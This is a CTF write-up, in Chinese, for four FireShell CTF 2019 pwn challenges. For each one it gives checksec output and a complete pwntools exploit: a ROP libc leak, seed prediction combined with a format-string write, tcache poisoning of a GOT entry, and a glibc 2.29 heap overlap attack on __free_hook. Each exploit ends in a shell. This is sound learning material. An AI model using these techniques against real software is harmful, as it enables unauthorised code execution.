## Pwn

### leakless

```
// file
leakless: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=3bdec1a89a0904139323ff129fcc60526bf290ca, for GNU/Linux 3.2.0, not stripped

// checksec
[*] '/tmp/tmp/fireshell-ctf-2019/pwn/leakless/src/leakless'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

雖然題目說 leakless，不過他有留 `puts()` 給我們用，所以透過 `puts()` 來 leak libc，透過簡單的 ROP 就能 get shell，exploit 如下:

```python
#!/usr/bin/python3
          
from pwn import *
          
r = process("./leakless")
          
puts_plt = 0x80490e0
alarm_got = 0x0804c014
feedme = 0x080492d3
          
payload = b"\xff"*(0x48+0x4) + p32(puts_plt) + p32(feedme) + p32(alarm_got)
r.send(payload)
libc = u32(r.recv(4)) - 0x0cd180
info(f"libc: {hex(libc)}")
binsh = libc + 0x192352
_system = libc + 0x045830
          
payload = b"\xff"*(0x48+0x4) + p32(_system) + p32(0) + p32(binsh)
                                       
r.send(payload)
r.interactive()
```

### casino

```
// file
casino:   ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=37ac91e33a2a6a4df59841a0c8f72cbda17335fe, for GNU/Linux 3.2.0, not stripped

// checksec
[*] '/tmp/tmp/fireshell-ctf-2019/pwn/casino/src/casino'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

- PRNG 拿當前時間當作 seed，因此能透過同步產生 `seed()` 來繞過
- index 少一次，透過 fmt 寫 `bet` 為 2~9 (只夠 `read()` 一個位數) 即可

exploit:

```python
#!/usr/bin/python3

from pwn import *
import subprocess
 
bet = 0x404020
 
r = process('./casino')
input()
r.send(b"%2c%11$n"+ p64(bet))
 
proc = subprocess.Popen(["./test"], stdout=subprocess.PIPE)
out, _ = proc.communicate()
num_list = list(map(int, out.split(b' ')[:-1]))
print(num_list)
 
for i in range(99):
    r.sendlineafter('/100] Guess my number: ', str(num_list[i]))
    print(f'[{i+1}/100] Guess my number: ' + str(hex(num_list[i])))
 
r.interactive()
```

`gen_rand.c`:

```c
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

int main()
{
    int seed = time(0) / 0xA;
    srand(seed+2);

    for (int i = 1; i <= 99; i++) {
        printf("%d ", rand());
    }
    puts("");
}
```

### babyheap

```
// file
babyheap:   ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=23008467de87c63ad5aedf5163924ae028313fd6, for GNU/Linux 3.2.0, stripped

// checksec
[*] '/tmp/tmp/fireshell-ctf-2019/pwn/babyheap/src/babyheap'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

glibc2.26 的 tcache poison，leak libc 後改 `atoi_got` 成 `system`，執行 `system("/bin/sh")`，exploit 如下:

```python
#!/usr/bin/python3

from pwn import *

"""
------- BabyHeap -------
1 - Create
2 - Edit
3 - Show
4 - Delete
5 - Exit
"""
def create(): # 0x60
    r.sendlineafter('> ', '1')

def read_content(payload):
    r.sendlineafter('> ', '2')
    r.sendafter('Content? ', payload) # 0x40

def show():
    r.sendlineafter('> ', '3')

def delete():
    r.sendlineafter('> ', '4') # clear create

def magic(payload):
    r.sendlineafter('> ', '1337')
    r.sendafter('Fill ', payload)

global_var = 0x4040A0
atoi_got = 0x404060

r = process("./B", env={"LD_PRELOAD": "./libc-2.26.so"})

create()
delete()
read_content(p64(global_var))
create()
magic(p64(0)*5 + p64(atoi_got))
show()
r.recvuntil('t: ')
libc = u64(r.recv(6).ljust(8, b'\x00')) - 0x38db0
info(f"libc: {hex(libc)}")
_system = libc + 0x47dc0

read_content(p64(_system))

r.interactive()
```

### quotes list

```
// file
quotes_list:   ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /opt/glibc/ld-linux-x86-64.so.2, BuildID[sha1]=5cf94e27bc7da208d0aea7c680b47b54042fe1c1, for GNU/Linux 3.2.0, stripped

// checksec
[*] '/tmp/tmp/fireshell-ctf-2019/pwn/quotes_list/src/quotes_list'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  '/opt/glibc'
```

glibc 2.29 有對 tcache 加上 key，不過打 heap 如果能創造 chunk overlap，基本上就能做到 leak heap base，而再透過 tcache 機制 + malloc largebin chunk，就能 leak libc，最後透過 tcache poison 來寫 `__free_hook`，exploit 如下:

```python
#!/usr/bin/python3

from pwn import *

"""
1) Create quote
2) Edit quote
3) Show quote
4) Delete quote
5) Exit
"""

def create(l, payload):
    r.sendlineafter("> ", "1")
    r.sendlineafter("Length: ", str(l))
    r.sendafter("Content: ", payload)

def edit(idx, payload):
    r.sendlineafter("> ", "2")
    r.sendlineafter("Index: ", str(idx))
    r.sendafter("Content: ", payload)

# 0 ~ 5
def show(idx):
    r.sendlineafter("> ", "3")
    r.sendlineafter("Index: ", str(idx))

def delete(idx):
    r.sendlineafter("> ", "4")
    r.sendlineafter("Index: ", str(idx))

r = process('./Q', env={"LD_PRELOAD": "./libc.so.6"})

create(0x28, b'\xff'*0x28) # add 0
create(0x108, b'\xee'*0x108) # add 1
edit(0, b'\xff'*0x28 + b'\xf0')
delete(1) # del 1, into 0x1f0 tcache
create(0x28, b'\xdd'*0x28) # add 1
create(0x420, b'\xaa') # add 2
create(0x48, b'\xbb') # add 3
delete(2) # del 2, libc
delete(3) # del 3
delete(1) # del 1
create(0x1e0, b'\xcc'*(0x100 + 0x18)) # add 1, write to tcache chunk 
show(1)
r.recvuntil(b'\xcc'*0x118)
heap = u64(r.recv(6).ljust(8, b'\x00'))
info(f"heap: {hex(heap)}")
edit(1, b'\xcc'*0x100 + p64(0) + p64(0x31) + p64(heap + 0x3c0))
create(0x28, b'\xaa') # add 2
create(0x28, b'\xaa') # add 3
show(3)
r.recvuntil('Quote: ')
libc = u64(r.recv(6).ljust(8, b'\x00')) - 0x3aecaa
info(f"libc: {hex(libc)}")
edit(3, p64(libc + 0x3aeca0)*2)
__free_hook = libc + 0x3b08c8
_system = libc + 0x41bf0
edit(1, b'\xff'*0x100 + p64(0) + p64(0x51))
delete(2) # del 2
edit(1, b'\xff'*0x100 + p64(0) + p64(0x51) + p64(__free_hook-0x8) + p64(heap))
create(0x48, b'\xaa') # add 2
create(0x48, b"/bin/sh\x00" + p64(_system)) # add 4
delete(4)

r.interactive()
```

不過這題原本想透過 top_chunk 來寫到 `__free_hook`，不過因為 `__free_hook` 上面找不到 valid 的 chunk header，因此最後還是用 tcache 來做 exploit。

- `LD_PRELOAD=./libc.so.6 ./ld-linux-x86-64.so.2 ./quotes_list` 可以直接用其他 linker 來 link binary
- 有其他做法 leak 的做法: allocate largebin chunk 並把他 free 掉，之後 allocate 時就會拿到此 chunk，並且會殘留 libc (fd, bk) 以及 heap (fd_nextsize, bk_nextsize)